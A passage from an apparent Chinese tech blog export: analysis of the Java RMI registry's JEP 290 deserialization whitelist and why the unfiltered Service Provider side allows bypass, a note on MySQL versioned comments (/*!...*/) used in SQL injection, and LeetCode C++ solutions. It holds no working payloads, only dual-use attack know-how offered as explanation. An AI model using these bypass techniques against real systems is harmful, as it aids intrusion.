ObjectInputFilter.Status status = registryFilter.checkInput(filterInfo);</span><br><span class="line">        <span class="keyword">if</span> (status != ObjectInputFilter.Status.UNDECIDED) &#123;</span><br><span class="line">            <span class="comment">// The Registry filter can override the built-in white-list</span></span><br><span class="line">            <span class="keyword">return</span> status;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterInfo.depth() &gt; REGISTRY_MAX_DEPTH) &#123;</span><br><span class="line">        <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">    &#125;</span><br><span class="line">    Class&lt;?&gt; clazz = filterInfo.serialClass();</span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (clazz.isArray()) &#123;</span><br><span class="line">            <span class="comment">// Arrays are REJECTED only if they exceed the limit</span></span><br><span class="line">            <span class="keyword">return</span> (filterInfo.arrayLength() &gt;= <span class="number">0</span> &amp;&amp; filterInfo.arrayLength() &gt; REGISTRY_MAX_ARRAY_SIZE)</span><br><span class="line">                ? ObjectInputFilter.Status.REJECTED</span><br><span class="line">                : ObjectInputFilter.Status.UNDECIDED;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (String.class == clazz</span><br><span class="line">                || java.lang.Number.class.isAssignableFrom(clazz)</span><br><span class="line">                || Remote.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)</span><br><span class="line">                || UnicastRef.class.isAssignableFrom(clazz)</span><br><span class="line">                || RMIClientSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">                || RMIServerSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.UNDECIDED;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">RegistryImpl</span><span class="params">(<span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> RemoteException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (port == Registry.REGISTRY_PORT &amp;&amp; System.getSecurityManager() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// grant permission for default port only.</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedExceptionAction&lt;Void&gt;() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Void <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">                    LiveRef lref = <span class="keyword">new</span> LiveRef(id, port);</span><br><span class="line">                    setup(<span class="keyword">new</span> UnicastServerRef(lref, RegistryImpl::registryFilter));</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, <span class="keyword">null</span>, <span class="keyword">new</span> SocketPermission(<span class="string">"localhost:"</span>+port, <span class="string">"listen,accept"</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PrivilegedActionException pae) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (RemoteException)pae.getException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        LiveRef lref = <span class="keyword">new</span> LiveRef(id, port);</span><br><span class="line">        setup(<span class="keyword">new</span> UnicastServerRef(lref, RegistryImpl::registryFilter)); <span class="comment">// 这一行, 将过滤器传给了 UnicastServerRef</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意有两个 registryFilter, 一个是静态函数, 一个是静态对象.<br>静态对象在类定义时被赋值, registryFilter 静态函数在函数体里面调用了 registryFilter 对象来检查.  </p>
<p>其中 registryFilter 对象来源应该就是从 JEP 290 加的属性 jdk.serialFilter 里面读取过滤规则. 因为 ObjectInputStream 里面只能设置一个 ObjectInputFilter. 如果要自定义, 就只能先读取原来的, 然后在自己新定义的 filter 中调用原来的. 否则原来的规则就没了, 所以底下的就是 RMI 真正新增的过滤.  </p>
<p>可以看到过滤规则主要就是: </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (String.class == clazz</span><br><span class="line">        || java.lang.Number.class.isAssignableFrom(clazz)</span><br><span class="line">        || Remote.class.isAssignableFrom(clazz)</span><br><span class="line">        || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)</span><br><span class="line">        || UnicastRef.class.isAssignableFrom(clazz)</span><br><span class="line">        || RMIClientSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">        || RMIServerSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">        || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)</span><br><span class="line">        || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>检查了反序列化对象是否是 <code>String</code> 或者是 <code>Number</code>, <code>Remote</code>, <code>Proxy</code>, <code>UnicastRef</code>, <code>RMIClientSocketFactory</code>, <code>RMIServerSocketFactory</code>, <code>ActivationID</code>, <code>UID</code> 的子类, 否则就拒绝反序列化, 可以看到是白名单, 还是挺靠谱的. 也确实效果挺好, 能 bypass 的也只有 JRMPClient.  </p>
<p>不过这只对 bind 等操作生效. 因为在真正调用远程对象时, 处理函数调用的是 Service Provider 而不是 Registry. Registry 是 RegistryImpl, 而 Service Provider 得到的是 RegistryImpl_Stub. 其在默认情况下是没有 filter 的,  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">RegistryImpl_Stub</span><span class="params">(java.rmi.server.RemoteRef ref)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(ref);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这也是 JEP-290 能被绕过的原因. 其只对 Registry 做了防护, 而 Service Provider 也会进行反序列化, 却没有做反序列化的防护.<br>当然, Service Provider 确实无法进行白名单层面的防护, 因为函数的参数类型是各种各样的, 估计也是出于对兼容性和黑名单被绕过的考虑, 也没进行黑名单防护.</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a href="https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/</a><br>[2] <a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/" target="_blank" rel="noopener">http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/</a>  </p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL 中类似 /*!2333 and */ 导致的注释注入</title>
    <url>/2018/10/11/Mysql%20%E7%9A%84%E6%B3%A8%E9%87%8A%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>之前似乎在某些教程贴中看到过, 但一直不知其解, 毕竟都在注释里了, 应该不会产生效果才对.  </p>
<a id="more"></a>

<p>今天偶然看到一个帖子, 才发现原来这其实是 MySQL 的一个 <code>方言</code>, 也就是说只能在 MySQL 中使用, 具体看<a href="https://dev.mysql.com/doc/refman/8.0/en/comments.html" target="_blank" rel="noopener">这里</a>.<code>!</code>后面的一串数字其实是版本号, <code>50110</code> 代表在版本号大于 <code>5.1.10</code> 的 MySQL 中, 注释里的语句将会被一并带入执行. 这么想就很清晰了, 毕竟这是 MySQL 的私货, 夹在注释里在不影响通用性的同时方便对不同版本做不同的语句优化.</p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 刷题记</title>
    <url>/2018/01/19/LeetCode%20%E5%88%B7%E9%A2%98%E8%AE%B0/</url>
    <content><![CDATA[<p>不想玩游戏, 那就练练算法啥的吧, 也是挺好玩的.</p>
<a id="more"></a>

<ol>
<li><h1 id="Two-Sum"><a href="#Two-Sum" class="headerlink" title="Two Sum"></a>Two Sum</h1></li>
</ol>
<p>只会暴力算法, Hash Table学习中.  </p>
<p>Given an array of integers, return <strong>indices</strong> of the two numbers such that they add up to a specific target. You may assume that each input would have <strong><em>exactly</em></strong> one solution, and you may not use the <em>same</em> element twice.<br><strong>Example:</strong></p>
<p>Given nums = [2, 7, 11, 15], target = 9,</p>
<p>Because nums[0] + nums[1] = 2 + 7 = 9,<br>return [0, 1].</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span><span class="comment">//复杂度为o(n²)</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; twoSum(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;nums.size();j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i]+nums[j]==target)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; temp=&#123;i,j&#125;;</span><br><span class="line">                    <span class="keyword">return</span> temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span><span class="comment">//复杂度为o(n)</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; twoSum(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">		<span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; aMap;</span><br><span class="line">		<span class="keyword">int</span> anOtherNum;</span><br><span class="line">		<span class="keyword">int</span> anOtherNumAdd;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.size(); ++i) &#123;</span><br><span class="line">			anOtherNum = target - nums[i];</span><br><span class="line">			<span class="keyword">if</span> (aMap.find(anOtherNum) != aMap.end()) &#123;</span><br><span class="line">				anOtherNumAdd = aMap[anOtherNum];</span><br><span class="line">				<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; answer;</span><br><span class="line">				answer.push_back(anOtherNumAdd);</span><br><span class="line">				answer.push_back(i);</span><br><span class="line">				<span class="keyword">return</span> answer;</span><br><span class="line">			&#125;</span><br><span class="line">			aMap.emplace(nums[i], i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><h1 id="Add-Two-Numbers"><a href="#Add-Two-Numbers" class="headerlink" title="Add Two Numbers"></a>Add Two Numbers</h1></li>
</ol>
<p>You are given two <strong>non-empty</strong> linked lists representing two non-negative integers. The digits are stored in <strong>reverse order</strong> and each of their nodes contain a single digit. Add the two numbers and return it as a linked list. You may assume the two numbers do not contain any leading zero, except the number 0 itself. <strong>Example</strong></p>
<p>Input: (2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)<br>Output: 7 -&gt; 0 -&gt; 8<br>Explanation: 342 + 465 = 807.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">addTwoNumbers</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">bool</span> add = <span class="literal">false</span>;</span><br><span class="line">		ListNode *now = <span class="literal">NULL</span>;</span><br><span class="line">		ListNode *last = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">		ListNode *first = last;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (l1!=<span class="literal">NULL</span> || l2!=<span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (l1 != <span class="literal">NULL</span> &amp;&amp; l2 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">				now = <span class="keyword">new</span> ListNode(l1-&gt;val + l2-&gt;val);</span><br><span class="line">				l1 = l1-&gt;next;</span><br><span class="line">				l2 = l2-&gt;next;</span><br><span class="line">				<span class="keyword">goto</span> next;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (l1 != <span class="literal">NULL</span> &amp;&amp; l2 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">				now = <span class="keyword">new</span> ListNode(l1-&gt;val);</span><br><span class="line">				l1 = l1-&gt;next;</span><br><span class="line">				<span class="keyword">goto</span> next;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (l1 == <span class="literal">NULL</span> &amp;&amp; l2 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">				now = <span class="keyword">new</span> ListNode(l2-&gt;val);</span><br><span class="line">				l2 = l2-&gt;next;</span><br><span class="line">				<span class="keyword">goto</span> next;</span><br><span class="line">			&#125;</span><br><span class="line">		next:</span><br><span class="line">			last-&gt;next = now;</span><br><span class="line">			<span class="keyword">if</span> (add) now-&gt;val += <span class="number">1</span>; <span class="comment">//进一位</span></span><br><span class="line">			<span class="keyword">if</span> (now-&gt;val &gt; <span class="number">9</span>) &#123;</span><br><span class="line">				now-&gt;val -= <span class="number">10</span>; <span class="comment">//满10减10同时使add=true, 使下一位进一</span></span><br><span class="line">				add = <span class="literal">true</span>;</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				add = <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (add &amp;&amp; l1 == <span class="literal">NULL</span> &amp;&amp; l2 == <span class="literal">NULL</span>) <span class="comment">//满10且两个链表都到头, 新建一位值为1, 应对(5),(5)之类的情况</span></span><br><span class="line">			&#123;</span><br><span class="line">				last = now;</span><br><span class="line">				now = <span class="keyword">new</span> ListNode(<span class="number">1</span>);</span><br><span class="line">				last-&gt;next = now;</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				last = now;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> first-&gt;next;</span><br><span class="line">    &#125;      </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><h1 id="Longest-Substring-Without-Repeating-Characters"><a href="#Longest-Substring-Without-Repeating-Characters" class="headerlink" title="Longest Substring Without Repeating Characters"></a>Longest Substring Without Repeating Characters</h1></li>
</ol>
<p>Given a string, find the length of the <strong>longest substring</strong> without repeating characters. <strong>Examples:</strong> Given <code>&quot;abcabcbb&quot;</code>, the answer is <code>&quot;abc&quot;</code>, which the length is 3. Given <code>&quot;bbbbb&quot;</code>, the answer is <code>&quot;b&quot;</code>, with the length of 1. Given <code>&quot;pwwkew&quot;</code>, the answer is <code>&quot;wke&quot;</code>, with the length of 3. Note that the answer must be a <strong>substring</strong>, <code>&quot;pwke&quot;</code> is a <em>subsequence</em> and not a substring.  </p>
<p>按照官方说明BF会超时233, 但是神奇的是我这个并没有.大概是C++大法好吧www.  </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">		<span class="built_in">string</span> longest;</span><br><span class="line">		<span class="built_in">string</span> temp = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.size(); ++i) &#123;</span><br><span class="line">			<span class="keyword">for</span> (; i &lt; s.size(); ++i) &#123;</span><br><span class="line">				<span class="keyword">if</span> (temp.find(s[i]) == s.npos) &#123;</span><br><span class="line">					temp.push_back(s[i]);</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;<span class="comment">//i++</span></span><br><span class="line">			<span class="keyword">if</span> (temp.size() &gt; longest.size()) &#123;</span><br><span class="line">				longest = temp;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (i != s.size()) &#123;</span><br><span class="line">				i = s.rfind(s[i], i - <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			temp.clear();</span><br><span class="line">		&#125;<span class="comment">//i++</span></span><br><span class="line">		<span class="keyword">return</span> longest.size();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">		<span class="built_in">unordered_map</span>&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt; aMap;<span class="comment">//记录每个出现的字符最后一次被遍历到的地址</span></span><br><span class="line">		<span class="built_in">unordered_map</span>&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt;::iterator itr;</span><br><span class="line">		<span class="keyword">int</span> add = <span class="number">-1</span>;</span><br><span class="line">		<span class="keyword">int</span> longest = <span class="number">-1</span>;</span><br><span class="line">		<span class="keyword">int</span> length;</span><br><span class="line">		<span class="keyword">char</span> chr;</span><br><span class="line">		<span class="keyword">if</span> (s.size() == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.size(); ++i) &#123;</span><br><span class="line">			chr = s[i];</span><br><span class="line">			itr = aMap.find(chr);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (itr == aMap.end()) &#123; <span class="comment">//如果这个字符没有被录入, 则将其录入</span></span><br><span class="line">				aMap.emplace(chr, i);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;				</span><br><span class="line">				<span class="keyword">if</span> (add &lt; itr-&gt;second) &#123;</span><br><span class="line">					add = itr-&gt;second;<span class="comment">//记录出现重复的字符的地址</span></span><br><span class="line">				&#125;			</span><br><span class="line">				itr-&gt;second = i;<span class="comment">//录入最后一次被遍历到的地址				</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			length = i - add;</span><br><span class="line">			<span class="keyword">if</span> (length &gt; longest) &#123;</span><br><span class="line">				longest = length;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> longest;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><h1 id="Median-of-Two-Sorted-Arrays"><a href="#Median-of-Two-Sorted-Arrays" class="headerlink" title="Median of Two Sorted Arrays"></a>Median of Two Sorted Arrays</h1></li>
</ol>
<p>There are two sorted arrays <strong>nums1</strong> and <strong>nums2</strong> of size m and n respectively. Find the median of the two sorted arrays. The overall run time complexity should be O(log (m+n)).<br><strong>Example 1:</strong></p>
<p>nums1 = [1, 3]<br>nums2 = [2]</p>
<p>The median is 2.0</p>
<p><strong>Example 2:</strong></p>
<p>nums1 = [1, 2]<br>nums2 = [3, 4]</p>
<p>The median is (2 + 3)/2 = 2.5</p>
<p>标准答案的复杂度为o(log(min(m,n))), 然而并不能看懂, 我就贴上我这个o(n)的吧</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums1, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">		<span class="built_in">multiset</span>&lt;<span class="keyword">int</span>&gt; aSet;</span><br><span class="line">		<span class="keyword">double</span> mid;</span><br><span class="line">		<span class="keyword">int</span> size;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums1.size(); ++i) &#123;</span><br><span class="line">			aSet.emplace(nums1[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums2.size(); ++i) &#123;</span><br><span class="line">			aSet.emplace(nums2[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		size = aSet.size();</span><br><span class="line">		<span class="keyword">if</span> (size % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">auto</span> itr = aSet.begin();</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size / <span class="number">2</span> - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">				itr++;</span><br><span class="line">			&#125;</span><br><span class="line">			mid = *itr++;</span><br><span class="line">			mid += *itr;</span><br><span class="line">			mid /= <span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">auto</span> itr = aSet.begin();</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt; (size / <span class="number">2</span>); ++i) &#123;</span><br><span class="line">				itr++;</span><br><span class="line">			&#125;</span><br><span class="line">			mid = *itr;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> mid;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li><h1 id="Longest-Palindromic-Substring"><a href="#Longest-Palindromic-Substring" class="headerlink" title="Longest Palindromic Substring"></a>Longest Palindromic Substring</h1></li>
</ol>
<p>Given a string <strong>s</strong>, find the longest palindromic substring in <strong>s</strong>. You may assume that the maximum length of <strong>s</strong> is 1000. <strong>Example:</strong></p>
<p>Input: “babad”</p>
<p>Output: “bab”</p>
<p>Note: “aba” is also a valid answer.</p>
<p><strong>Example:</strong></p>
<p>Input: “cbbd”</p>
<p>Output: “bb”</p>
<p>其实一般都最先想这种拓展两边的方法把0.0 马拉车算法真的太强了…</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="built_in">string</span> <span class="title">longestPalindrome</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s.size() == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="built_in">string</span> longest;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> left;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> right;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> len1;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> len2;</span><br><span class="line">		<span class="keyword">size_t</span> size = s.size();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			left = i;</span><br><span class="line">			right = i;</span><br><span class="line">			<span class="keyword">while</span> (left &gt; <span class="number">0</span> &amp;&amp; right &lt; size - <span class="number">1</span> &amp;&amp; s[left - <span class="number">1</span>] == s[right + <span class="number">1</span>])</span><br><span class="line">			&#123;</span><br><span class="line">				left--;</span><br><span class="line">				right++;</span><br><span class="line">			&#125;</span><br><span class="line">			len1 = right - left + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">			left = i;</span><br><span class="line">			right = i;</span><br><span class="line">			<span class="keyword">if</span> (s[left] == s[right + <span class="number">1</span>])</span><br><span class="line">			&#123;</span><br><span class="line">				right++;</span><br><span class="line">				<span class="keyword">while</span> (left &gt; <span class="number">0</span> &amp;&amp; right &lt; size - <span class="number">1</span> &amp;&amp; s[left - <span class="number">1</span>] == s[right + <span class="number">1</span>])</span><br><span class="line">				&#123;</span><br><span class="line">					left--;</span><br><span class="line">					right++;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;			</span><br><span class="line">			len2 = right - left + <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">if</span> (len1 &gt; len2 &amp;&amp; len1 &gt; longest.size())</span><br><span class="line">			&#123;</span><br><span class="line">				longest = s.substr(i - len1 / <span class="number">2</span>, len1);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (len2 &gt; longest.size())</span><br><span class="line">				&#123;</span><br><span class="line">					longest = s.substr(i - len2 / <span class="number">2</span> + <span class="number">1</span>, len2);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> longest;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//向大佬低头.jpg </span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Manacher's 算法实际上相当于Expand Around Center算法的强化版, </span></span><br><span class="line"><span class="comment">它通过记录每个字符的最长回文数和当前最后的回文位置, 实现了减少</span></span><br><span class="line"><span class="comment">部分重复的运算(如果了解的话会明白为什么是o(n)复杂度, 因为实际上每个字符只会与另一个字符比较一遍)</span></span><br><span class="line"><span class="comment">也就是每个字符只会被执行(str[i + count[i] + 1] == str[i - count[i] - 1])一次, 不过代来的</span></span><br><span class="line"><span class="comment">牺牲就是需要o(n)的空间复杂度, Expand Around Center可是o(1)的.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="built_in">string</span> <span class="title">longestPalindrome</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">		<span class="built_in">string</span> str = <span class="string">"#"</span>;</span><br><span class="line">		<span class="built_in">string</span> longest;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">auto</span> iter = s.begin(); iter != s.end(); ++iter)</span><br><span class="line">		&#123;</span><br><span class="line">			str.push_back(*iter);</span><br><span class="line">			str.push_back(<span class="string">'#'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; count(str.size(), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> mx = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> id = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str.size(); ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (i &lt; mx)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (count[<span class="number">2</span> * id - i] &gt; mx - i)</span><br><span class="line">				&#123;</span><br><span class="line">					count[i] = mx - i;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					count[i] = count[<span class="number">2</span> * id - i];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span 